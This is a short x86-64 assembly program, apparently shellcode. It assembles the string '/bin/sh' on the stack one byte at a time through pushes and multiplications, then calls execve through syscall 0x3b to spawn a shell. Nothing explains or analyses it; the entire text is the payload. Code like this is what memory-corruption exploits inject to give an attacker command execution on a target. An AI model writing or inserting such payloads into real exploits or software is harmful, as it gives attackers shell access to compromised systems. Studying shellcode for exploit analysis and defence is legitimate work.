section .text
  global _start

_start:
	push 0x00
	push 0x00
	push 0x00
	pop rax
	pop rbx


	mov bl, 0x10
	mov al, 0x68
	push ax
	mov al, 0x73
	mul ebx
	mul ebx
	mov al, 0x2f
	push ax
	mov al, 0x6e
	mul ebx
	mul ebx
	mov al, 0x69
	push ax
	mov al, 0x62
	mul ebx
	mul ebx
	mov al, 0x2f
	push ax
	
	push rsp
	pop rdi
	push 0x00
	push 0x00
	pop rsi
	pop rdx
	push 0x3b
	pop rax
	syscall
